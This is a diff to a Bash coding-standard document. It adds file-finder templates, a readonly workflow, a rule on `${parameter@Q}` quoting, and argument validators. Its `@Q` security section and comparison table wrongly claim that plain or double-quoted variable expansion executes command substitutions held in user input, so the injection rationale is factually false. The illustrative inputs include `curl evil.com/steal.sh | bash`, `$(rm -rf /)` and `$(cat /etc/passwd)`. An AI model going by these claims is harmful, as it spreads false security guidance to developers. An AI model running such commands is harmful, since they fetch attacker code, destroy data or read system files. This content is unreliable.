@@ -2746,9 +2746,152 @@ install -d "$USER_CACHE_DIR"
 install -d "$USER_STATE_DIR"
 \`\`\`
 
+**Production-Ready Templates (Copy-Paste Ready):**
+
+These templates are extracted from the `bcs` script itself and demonstrate production-tested FHS compliance patterns. Adapt by replacing `yatti/bash-coding-standard` with your organization/project name.
+
+**Template 1: Find File in FHS Locations**
+
+This template searches for a specific file across all standard FHS locations, supporting development mode, custom PREFIX installs, system-local, and system-wide installations.
+
+\`\`\`bash
+# Find specific file (e.g., BASH-CODING-STANDARD.md, config.yml, data.json)
+# Usage: bcs_file=$(find_bcs_file "$SCRIPT_DIR") || die 'File not found'
+find_bcs_file() {
+  local -- script_dir=$1
+  local -- install_share="${script_dir%/bin}/share/yatti/bash-coding-standard"
+  local -a search_paths=(
+    "$script_dir"                                 # Development: same directory
+    "$install_share"                              # Custom PREFIX: relative to bin/
+    /usr/local/share/yatti/bash-coding-standard   # System-local install
+    /usr/share/yatti/bash-coding-standard         # System-wide install
+  )
+  local -- path
+  for path in "${search_paths[@]}"; do
+    [[ -f "$path"/BASH-CODING-STANDARD.md ]] && { echo "$path"/BASH-CODING-STANDARD.md; return 0; }
+  done
+
+  return 1
+}
+declare -fx find_bcs_file
+
+# Usage example:
+BCS_FILE=$(find_bcs_file "$SCRIPT_DIR") || die 1 'BASH-CODING-STANDARD.md not found'
+\`\`\`
+
+**Key features of this template:**
+- **`install_share` calculation**: Dynamically computes share directory from bin directory using `${script_dir%/bin}/share/...`
+- **Four search locations**: Development, custom PREFIX, /usr/local, /usr
+- **Early return on found**: Uses `&& { echo ...; return 0; }` for immediate success
+- **Export**: Uses `declare -fx` for use in subshells if needed
+
+**Adaptation guide:**
+```bash
+# Replace 'yatti/bash-coding-standard' with your org/project:
+install_share="${script_dir%/bin}/share/myorg/myproject"
+/usr/local/share/myorg/myproject
+/usr/share/myorg/myproject
+
+# Replace 'BASH-CODING-STANDARD.md' with your target file:
+[[ -f "$path"/config.yml ]] && { echo "$path"/config.yml; return 0; }
+
+# Rename function to match purpose:
+find_config_file() { ... }
+find_template_file() { ... }
+```
+
+**Template 2: Find Data Directory**
+
+This template finds the data directory itself (rather than a specific file), useful for scripts that need to enumerate or access multiple files within the data directory.
+
+\`\`\`bash
+# Find data directory in FHS locations
+# Usage: data_dir=$(find_data_dir) || die 'Data directory not found'
+find_data_dir() {
+  local -- install_share="${BCS_DIR%/bin}/share/yatti/bash-coding-standard/data"
+  local -a search_paths=(
+    "$BCS_DIR/data"                                   # Development mode
+    "$install_share"                                  # Custom PREFIX install
+    /usr/local/share/yatti/bash-coding-standard/data  # System-local install
+    /usr/share/yatti/bash-coding-standard/data        # System-wide install
+  )
+  local -- path
+  for path in "${search_paths[@]}"; do
+    [[ -d "$path" ]] && { echo "$path"; return 0; }
+  done
+
+  return 1
+}
+declare -fx find_data_dir
+
+# Usage example:
+DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
+\`\`\`
+
+**Differences from Template 1:**
+- **Directory check**: Uses `[[ -d "$path" ]]` instead of `[[ -f ... ]]`
+- **Returns directory**: Echoes directory path, not file path
+- **Enables enumeration**: Caller can then use `find "$DATA_DIR" ...` or `for file in "$DATA_DIR"/*.md`
+
+**Usage patterns:**
+\`\`\`bash
+# Pattern 1: Find and enumerate files
+DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
+readarray -t md_files < <(find "$DATA_DIR" -name '*.md' | sort)
+
+# Pattern 2: Check for specific files in data directory
+DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
+[[ -f "$DATA_DIR"/templates/basic.sh ]] || die 1 'Template not found'
+
+# Pattern 3: Iterate over data files
+DATA_DIR=$(find_data_dir) || die 1 'Data directory not found'
+for file in "$DATA_DIR"/*.json; do
+  process_json "$file"
+done
+\`\`\`
+
+**Combined Template: Universal FHS Resource Finder**
+
+For maximum flexibility, combine both patterns into a generic resource finder:
+
+\`\`\`bash
+# Generic FHS resource finder
+# Usage: find_resource file "config.yml" || die 'Config not found'
+# Usage: find_resource dir "data" || die 'Data directory not found'
+find_resource() {
+  local -- type=$1     # 'file' or 'dir'
+  local -- name=$2     # Resource name
+  local -- install_base="${SCRIPT_DIR%/bin}/share/myorg/myproject"
+  local -a search_paths=(
+    "$SCRIPT_DIR"                        # Development
+    "$install_base"                      # Custom PREFIX
+    /usr/local/share/myorg/myproject     # Local install
+    /usr/share/myorg/myproject           # System install
+  )
+
+  local -- path
+  for path in "${search_paths[@]}"; do
+    local -- resource="$path/$name"
+    case "$type" in
+      file) [[ -f "$resource" ]] && { echo "$resource"; return 0; } ;;
+      dir)  [[ -d "$resource" ]] && { echo "$resource"; return 0; } ;;
+      *)    die 2 "Invalid resource type ${type@Q}" ;;
+    esac
+  done
+
+  return 1
+}
+declare -fx find_resource
+
+# Usage:
+CONFIG=$(find_resource file config.yml) || die 'Config not found'
+DATA_DIR=$(find_resource dir data) || die 'Data directory not found'
+TEMPLATE=$(find_resource file templates/basic.sh) || die 'Template not found'
+\`\`\`
+
 **Real-world example from this repository:**
 
-The `bash-coding-standard` script searches for `BASH-CODING-STANDARD.md` in:
+The actual `bash-coding-standard` (bcs) script uses these exact patterns (lines 137-171 in bcs). Here's the simplified version showing the file search:
 
 \`\`\`bash
 find_bcs_file() {
@@ -4406,6 +4549,40 @@ readonly -- SCRIPT_PATH SCRIPT_DIR
 - **Maintainability**: Easy to add/remove variables from the readonly group
 - **Readability**: Separates initialization phase (values) from protection phase (readonly)
 - **Error Detection**: If any variable hasn't been initialized before readonly, script fails explicitly
+
+**Three-Step Progressive Readonly Workflow:**
+
+This is the standard pattern for variables that can only be finalized after argument parsing or runtime configuration:
+
+**Step 1 - Declare with defaults:**
+```bash
+declare -i VERBOSE=0 DRY_RUN=0
+declare -- OUTPUT_FILE='' PREFIX='/usr/local'
+```
+
+**Step 2 - Parse and modify in main():**
+```bash
+main() {
+  while (($#)); do case $1 in
+    -v) VERBOSE=1 ;;
+    -n) DRY_RUN=1 ;;
+    --output) noarg "$@"; shift; OUTPUT_FILE="$1" ;;
+    --prefix) noarg "$@"; shift; PREFIX="$1" ;;
+  esac; shift; done
+
+  # Step 3 - Make readonly AFTER parsing complete
+  readonly -- VERBOSE DRY_RUN OUTPUT_FILE PREFIX
+
+  # Now safe to use - all readonly
+  ((VERBOSE)) && info "Using prefix: $PREFIX"
+}
+```
+
+**Rationale for three-step pattern:**
+- Variables must be **mutable during parsing** (Step 2)
+- Making readonly **too early** prevents modification
+- Making readonly **after parsing** locks in final values (Step 3)
+- Prevents accidental modification throughout rest of script
 
 **Exception - Script Metadata:**
 
@@ -8374,6 +8551,348 @@ decp() { declare -p "$@" | sed 's/^declare -[a-zA-Z-]* //'; }
 \`\`\`bash
 s() { (( ${1:-1} == 1 )) || echo -n 's'; }
 \`\`\`
+
+
+---
+
+
+**Rule: BCS0415**
+
+## Parameter Quoting with `${parameter@Q}`
+
+**Use the `${parameter@Q}` shell quoting operator to safely quote parameter values in error messages, logging output, and debugging statements.**
+
+**Rationale:**
+- **Prevents injection**: Safely displays user input that might contain shell metacharacters
+- **Preserves special characters**: Shows actual content without expansion or interpretation
+- **Re-usable output**: Produces shell-quoted strings that can be copy-pasted back into shell
+- **Security**: Protects against malicious input in error messages
+- **Debugging aid**: Shows exact parameter values including whitespace and special chars
+
+### The `@Q` Operator
+
+**Syntax:** `${parameter@Q}`
+
+**What it does:** Expands to the parameter value quoted in a format that can be re-used as shell input.
+
+**Example:**
+```bash
+name='hello world'
+echo "${name@Q}"      # Output: 'hello world'
+
+name="foo's bar"
+echo "${name@Q}"      # Output: 'foo'\''s bar'
+
+name='$(rm -rf /)'
+echo "${name@Q}"      # Output: '$(rm -rf /)'
+```
+
+### Primary Use Cases
+
+**1. Error Messages**
+
+The most common use: safely displaying user-provided arguments in error messages.
+
+```bash
+# Without @Q - Injection risk
+die 2 "Unknown option $1"
+# Input: --option='`rm -rf /`'
+# Output: Unknown option `rm -rf /`  (EXPANDS! Security risk!)
+
+# With @Q - Safe
+die 2 "Unknown option ${1@Q}"
+# Input: --option='`rm -rf /`'
+# Output: Unknown option '`rm -rf /`'  (Literal, safe)
+```
+
+**Complete example from argument validation:**
+```bash
+arg2() {
+  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
+    die 2 "${1@Q} requires argument"  # Safe parameter quoting
+  fi
+}
+
+arg2_num() {
+  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
+    die 2 "${1@Q} requires a numeric argument"  # Safe parameter quoting
+  fi
+}
+
+# Usage:
+./script --depth='$(cat /etc/passwd)'
+# Output: '--depth='$(cat /etc/passwd)'' requires a numeric argument
+# Note: Command substitution NOT executed, shown literally
+```
+
+**2. Logging and Debug Output**
+
+Show exact values of variables for debugging:
+
+```bash
+debug() {
+  ((DEBUG)) || return 0
+  local -- msg="$1"
+  shift
+  local -- arg
+  for arg in "$@"; do
+    msg+=" ${arg@Q}"  # Quote each argument
+  done
+  >&2 echo "[DEBUG] $msg"
+}
+
+# Usage:
+debug "Processing files:" "$file1" "$file2"
+# Output: [DEBUG] Processing files: 'foo bar.txt' 'test  file.txt'
+#                                     ^           ^
+#                                     Shows spaces clearly
+```
+
+**3. Displaying User Input**
+
+When echoing back what the user entered:
+
+```bash
+info "You entered ${filename@Q}"
+# Input: filename='file with spaces & specials'
+# Output: You entered 'file with spaces & specials'
+
+warn "Skipping invalid entry ${entry@Q}"
+# Input: entry='$HOME/test'
+# Output: Skipping invalid entry '$HOME/test'  (not expanded)
+```
+
+**4. Verbose/Dry-Run Mode**
+
+Show exact commands that would be executed:
+
+```bash
+run_command() {
+  local -a cmd=("$@")
+
+  if ((DRY_RUN)); then
+    # Show command with all arguments properly quoted
+    local -- quoted_cmd
+    printf -v quoted_cmd '%s ' "${cmd[@]@Q}"
+    info "[DRY-RUN] Would execute: $quoted_cmd"
+    return 0
+  fi
+
+  "${cmd[@]}"
+}
+
+# Usage:
+run_command rm -f "/tmp/file with spaces.txt"
+# Output: [DRY-RUN] Would execute: rm -f '/tmp/file with spaces.txt'
+```
+
+### Complete Example
+
+```bash
+#!/bin/bash
+set -euo pipefail
+shopt -s inherit_errexit shift_verbose extglob nullglob
+
+declare -r VERSION='1.0.0'
+#shellcheck disable=SC2155
+declare -r SCRIPT_PATH=$(realpath -- "$0")
+declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
+
+# Messaging functions using @Q for safe parameter display
+error() {
+  >&2 echo "${RED}✗${NC} ${SCRIPT_NAME}: $*"
+}
+
+die() {
+  local -i code=${1:-1}
+  shift
+  (($#)) && error "$@"
+  exit "$code"
+}
+
+# Argument validators using @Q
+arg2() {
+  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
+    die 2 "${1@Q} requires argument"
+  fi
+}
+
+arg2_num() {
+  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
+    die 2 "${1@Q} requires a numeric argument"
+  fi
+}
+
+# Debug function showing all arguments
+debug() {
+  ((DEBUG)) || return 0
+  local -- msg="[DEBUG] $SCRIPT_NAME:"
+  local -- arg
+  for arg in "$@"; do
+    msg+=" ${arg@Q}"
+  done
+  >&2 echo "$msg"
+}
+
+# Main argument parsing
+main() {
+  declare -i DEBUG=0 DRY_RUN=0
+  declare -- OUTPUT_FILE=''
+  declare -a INPUT_FILES=()
+
+  while (($#)); do case $1 in
+    -o|--output)
+      arg2 "$@"
+      shift
+      OUTPUT_FILE="$1"
+      ;;
+
+    -d|--debug)
+      DEBUG=1
+      ;;
+
+    -n|--dry-run)
+      DRY_RUN=1
+      ;;
+
+    -*)
+      die 22 "Invalid option ${1@Q}"  # Safe quoting
+      ;;
+
+    *)
+      INPUT_FILES+=("$1")
+      ;;
+  esac; shift; done
+
+  # Debug output shows exact values
+  debug "OUTPUT_FILE=$OUTPUT_FILE" "INPUT_FILES=(${INPUT_FILES[*]@Q})"
+
+  # Processing logic...
+}
+
+main "$@"
+#fin
+```
+
+### Comparison Table
+
+| Input Value | `$var` | `"$var"` | `${var@Q}` |
+|-------------|--------|----------|------------|
+| `hello world` | `hello` `world` (splits) | `hello world` | `'hello world'` |
+| `foo's bar` | `foos` `bar` (syntax error) | `foo's bar` | `'foo'\''s bar'` |
+| `$(date)` | *executes command* | *executes command* | `'$(date)'` (literal) |
+| `*.txt` | *glob expands* | `*.txt` | `'*.txt'` |
+| `$HOME/test` | */home/user/test* (expands) | */home/user/test* (expands) | `'$HOME/test'` (literal) |
+| Empty string | *(nothing)* | `` (empty) | `''` (quotes shown) |
+
+### When to Use `${var@Q}`
+
+**✓ Use for:**
+- Error messages with user input: `die 2 "Invalid option ${opt@Q}"`
+- Logging user-provided values: `info "Processing ${filename@Q}"`
+- Debug output: `debug "vars:" "${arr[@]@Q}"`
+- Dry-run command display: `info "[DRY-RUN] ${cmd@Q}"`
+- Showing validation failures: `warn "Rejecting ${input@Q}"`
+
+**✗ Don't use for:**
+- Normal variable expansion in logic: `process "$filename"` (not `process "${filename@Q}"`)
+- Data output to stdout: `echo "$result"` (not `echo "${result@Q}"`)
+- Assignments: `target="$source"` (not `target="${source@Q}"`)
+- Comparisons: `[[ "$var" == "$value" ]]` (not with @Q)
+
+### Security Example
+
+Demonstrates why `@Q` is critical for security:
+
+```bash
+# Vulnerable code (NO @Q)
+validate_input() {
+  [[ -z "$1" ]] && die 2 "Option $2 requires argument"
+  # User input: --name='`curl evil.com/steal.sh | bash`'
+  # Error message executes command: Option `curl evil.com/steal.sh | bash` requires argument
+}
+
+# Safe code (WITH @Q)
+validate_input() {
+  [[ -z "$1" ]] && die 2 "Option ${2@Q} requires argument"
+  # User input: --name='`curl evil.com/steal.sh | bash`'
+  # Error message shows literally: Option '`curl evil.com/steal.sh | bash`' requires argument
+}
+```
+
+### Other `@` Operators (for reference)
+
+Bash provides several parameter transformation operators:
+
+| Operator | Purpose | Example |
+|----------|---------|---------|
+| `${var@Q}` | Quote for shell reuse | `'hello world'` |
+| `${var@E}` | Expand escape sequences | `$'hello\nworld'` |
+| `${var@P}` | Prompt expansion | *(PS1-style expansion)* |
+| `${var@A}` | Assignment form | `var='value'` |
+| `${var@a}` | Attributes | `declare -i` → `i` |
+| `${var@U}` | Uppercase | `HELLO` |
+| `${var@L}` | Lowercase | `hello` |
+
+**For BCS purposes, `@Q` is the most commonly used** for safe parameter display in error messages and logging.
+
+### Anti-Patterns
+
+```bash
+# ✗ Wrong - No quoting, injection risk
+die 2 "Unknown option $1"
+
+# ✗ Wrong - Double quotes don't prevent expansion
+die 2 "Unknown option \"$1\""
+# Input: --opt='$(rm -rf /)'
+# Still expands: Unknown option "$(rm -rf /)"
+
+# ✗ Wrong - Manual escaping fragile
+die 2 "Unknown option '$(sed "s/'/'\\\\''/g" <<<"$1")'"
+
+# ✓ Correct - Use @Q operator
+die 2 "Unknown option ${1@Q}"
+```
+
+### Integration with Standard Functions
+
+The `@Q` operator integrates seamlessly with standard BCS messaging and validation patterns:
+
+```bash
+# Messaging functions (BCS09)
+error() { >&2 echo "${RED}✗${NC} $*"; }
+die() { (($# > 1)) && error "${@:2}"; exit "${1:-1}"; }
+
+# Usage with @Q
+die 22 "Invalid option ${opt@Q}"  # Safe
+
+# Validation helpers (BCS10)
+arg2() {
+  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
+    die 2 "${1@Q} requires argument"  # Safe
+  fi
+}
+
+# Progressive readonly (BCS0205)
+readonly -- VERSION SCRIPT_PATH  # Variables themselves
+# But when displaying in errors:
+info "Using version ${VERSION@Q}"  # Safe display
+```
+
+### Summary
+
+**The `${parameter@Q}` operator is critical for:**
+1. Security - prevents command injection in error messages
+2. Clarity - shows exact values including whitespace
+3. Debugging - produces re-usable shell input
+4. Consistency - standard way to quote user input across all scripts
+
+**Standard pattern:** Any time you display user input in error messages, warnings, or logs, use `${parameter@Q}`.
+
+**See also:**
+- BCS1003 - Argument Validation (uses `@Q` extensively)
+- BCS0903 - Core Message Functions (error/die integration)
+- BCS0406 - Variables in Conditionals (when NOT to use @Q)
 
 
 ---
@@ -15416,15 +15935,47 @@ somefunc() {
 
 **Core messaging function pattern:**
 
-The pattern uses a private `_msg()` function that inspects `FUNCNAME[1]` (the calling function) to determine formatting:
+The pattern uses a private `_msg()` function that inspects `FUNCNAME[1]` (the calling function) to determine formatting.
+
+### Understanding FUNCNAME Inspection
+
+**The FUNCNAME array** is a Bash built-in that contains the current function call stack:
+- `${FUNCNAME[0]}` = Current function name (`_msg` in this case)
+- `${FUNCNAME[1]}` = Calling function name (`info`, `warn`, `error`, etc.)
+- `${FUNCNAME[2]}` = Function that called the calling function
+- And so on up the call stack
+
+**Why this is powerful:**
+
+Instead of passing a parameter (`_msg "INFO" "$message"`), we inspect `FUNCNAME[1]` to automatically detect **who called us**. This enables a single `_msg()` implementation to format differently based on caller.
+
+**Call stack example:**
+```bash
+main() {
+  process_file "test.txt"
+}
+
+process_file() {
+  info "Processing $1"
+  # When info() calls _msg():
+  #   FUNCNAME[0] = "_msg"     (current function)
+  #   FUNCNAME[1] = "info"     (caller - this determines formatting!)
+  #   FUNCNAME[2] = "process_file"
+  #   FUNCNAME[3] = "main"
+}
+```
+
+**Implementation:**
 
 \`\`\`bash
 # Private core messaging function
 _msg() {
   local -- prefix="$SCRIPT_NAME:" msg
 
-  # Detect calling function and set appropriate prefix/color
+  # Inspect FUNCNAME[1] to detect calling function
+  # This determines which color/symbol to use
   case "${FUNCNAME[1]}" in
+    vecho)   ;;  # No special prefix
     success) prefix+=" ${GREEN}✓${NC}" ;;
     warn)    prefix+=" ${YELLOW}▲${NC}" ;;
     info)    prefix+=" ${CYAN}◉${NC}" ;;
@@ -15439,6 +15990,13 @@ _msg() {
   done
 }
 \`\`\`
+
+**Benefits of FUNCNAME inspection:**
+1. **DRY**: Single `_msg()` function, no duplication
+2. **Automatic**: Caller doesn't pass formatting hint, it's detected automatically
+3. **Consistent**: Impossible to pass wrong level (`info "ERROR: ..."` prevented)
+4. **Maintainable**: Add new message types by adding wrapper functions, no `_msg()` changes needed
+5. **Self-documenting**: Function name IS the message level
 
 **Public wrapper functions:**
 
@@ -17159,9 +17717,243 @@ The \`--version\` option should output the script name followed by a space and t
 **Rule: BCS1003**
 
 ## Argument Validation
-\`\`\`bash
-noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option '$1'"; }
-\`\`\`
+
+**Use validation helpers to ensure option arguments exist and are valid types before processing.**
+
+**Rationale:** Prevents silent failures, provides clear error messages, catches user mistakes (like `--output --verbose` where filename is missing), validates data types before use.
+
+### Three Validation Patterns
+
+**1. `noarg()` - Basic Existence Check**
+
+Validates that an option has an argument following it.
+
+```bash
+noarg() {
+  (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option '$1'"
+}
+```
+
+**Usage:**
+```bash
+while (($#)); do case $1 in
+  -o|--output)
+    noarg "$@"      # Validate argument exists
+    shift
+    OUTPUT="$1"     # Now safe to use $1
+    ;;
+esac; shift; done
+```
+
+**What it checks:**
+- `(($# > 1))` - At least 2 arguments remain (option + value)
+- `[[ ${2:0:1} != '-' ]]` - Next argument doesn't start with `-`
+
+**2. `arg2()` - Enhanced Validation with Safe Quoting**
+
+Enhanced version with better error messages using shell quoting (`${1@Q}`).
+
+```bash
+arg2() {
+  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
+    die 2 "${1@Q} requires argument"
+  fi
+}
+```
+
+**Usage:**
+```bash
+while (($#)); do case $1 in
+  -p|--prefix)
+    arg2 "$@"       # Enhanced validation
+    shift
+    PREFIX="$1"
+    ;;
+esac; shift; done
+```
+
+**Differences from `noarg()`:**
+- Uses `${#@}-1<1` for argument count (explicit remaining args)
+- Uses `${1@Q}` for safe parameter quoting in error message
+- More concise error message format
+
+**Benefits:**
+- **Catches:** `script --output --verbose` (no filename provided)
+- **Prevents:** Using next option as value
+- **Safe quoting:** `${1@Q}` escapes special characters in error output
+
+**3. `arg2_num()` - Numeric Argument Validation**
+
+Validates that an option's argument is a valid integer.
+
+```bash
+arg2_num() {
+  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
+    die 2 "${1@Q} requires a numeric argument"
+  fi
+}
+```
+
+**Usage:**
+```bash
+while (($#)); do case $1 in
+  -d|--depth)
+    arg2_num "$@"   # Validate numeric
+    shift
+    MAX_DEPTH="$1"  # Guaranteed to be integer
+    ;;
+  -C|--context)
+    arg2_num "$@"
+    shift
+    CONTEXT_LINES="$1"
+    ;;
+esac; shift; done
+```
+
+**What it validates:**
+- Argument exists (`${#@}-1<1`)
+- Argument matches integer pattern (`^[0-9]+$`)
+- Rejects: negative numbers, decimals, non-numeric text
+
+**Type safety benefit:**
+```bash
+# Without validation:
+-d|--depth) shift; MAX_DEPTH="$1" ;;
+# User types: script --depth abc
+# Result: MAX_DEPTH='abc' → errors in arithmetic later
+
+# With validation:
+-d|--depth) arg2_num "$@"; shift; MAX_DEPTH="$1" ;;
+# User types: script --depth abc
+# Result: Immediate clear error: '--depth requires a numeric argument'
+```
+
+### Complete Example with All Three
+
+```bash
+declare -i MAX_DEPTH=5 VERBOSE=0
+declare -- OUTPUT_FILE=''
+declare -a INPUT_FILES=()
+
+main() {
+  while (($#)); do case $1 in
+    -o|--output)
+      arg2 "$@"                 # String validation
+      shift
+      OUTPUT_FILE="$1"
+      ;;
+
+    -d|--depth)
+      arg2_num "$@"             # Numeric validation
+      shift
+      MAX_DEPTH="$1"
+      ;;
+
+    -v|--verbose)
+      VERBOSE=1                 # No argument needed
+      ;;
+
+    -h|--help)
+      noarg "$@"                # Basic check (also valid)
+      shift
+      HELP_TOPIC="$1"
+      ;;
+
+    -*)
+      die 22 "Invalid option ${1@Q}"
+      ;;
+
+    *)
+      INPUT_FILES+=("$1")       # Positional argument
+      ;;
+  esac; shift; done
+
+  readonly -- OUTPUT_FILE MAX_DEPTH VERBOSE
+
+  # ... rest of script
+}
+
+# Validation helpers
+arg2() {
+  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
+    die 2 "${1@Q} requires argument"
+  fi
+}
+
+arg2_num() {
+  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
+    die 2 "${1@Q} requires a numeric argument"
+  fi
+}
+
+noarg() {
+  (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option '$1'"
+}
+
+main "$@"
+```
+
+### Choosing the Right Validator
+
+| Validator | Use Case | Example Options |
+|-----------|----------|----------------|
+| `noarg()` | Simple existence check | `-o FILE`, `-m MSG` |
+| `arg2()` | String args, prevent `-` prefix | `--prefix PATH`, `--output FILE` |
+| `arg2_num()` | Numeric args requiring integers | `--depth NUM`, `--retries COUNT`, `-C NUM` |
+
+### Anti-Patterns
+
+```bash
+# ✗ No validation - silent failure
+-o|--output) shift; OUTPUT="$1" ;;
+# Problem: --output --verbose → OUTPUT='--verbose'
+
+# ✗ No validation - type error later
+-d|--depth) shift; MAX_DEPTH="$1" ;;
+# Problem: --depth abc → arithmetic errors: "abc: syntax error"
+
+# ✗ Manual validation - verbose
+-p|--prefix)
+  if (($# < 2)); then
+    die 2 "Option '-p' requires an argument"
+  fi
+  shift
+  PREFIX="$1"
+  ;;
+# Problem: Repetitive, verbose, inconsistent error messages
+
+# ✓ Use helpers
+-p|--prefix) arg2 "$@"; shift; PREFIX="$1" ;;
+```
+
+### Error Message Quality
+
+**Note the `${1@Q}` pattern** used in `arg2()` and `arg2_num()`:
+
+```bash
+# User input: script '--some-weird$option' value
+# With ${1@Q}: error: '--some-weird$option' requires argument
+# Without:     error: --some-weird (crashes or expands $option)
+```
+
+See BCS04XX for detailed explanation of the `${parameter@Q}` shell quoting operator.
+
+### Integration with Case Statements
+
+These validators work seamlessly with the standard argument parsing pattern (BCS1001):
+
+```bash
+while (($#)); do case $1 in
+  -d|--depth)     arg2_num "$@"; shift; MAX_DEPTH="$1" ;;
+  -v|--verbose)   VERBOSE=1 ;;
+  -h|--help)      show_help; exit 0 ;;
+  -[dvh]*)        set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
+  -*)             die 22 "Invalid option ${1@Q}" ;;
+  *)              FILES+=("$1") ;;
+esac; shift; done
+```
+
+**Critical:** Always call validator BEFORE `shift` - validator needs to inspect `$2`.
 
 
 ---
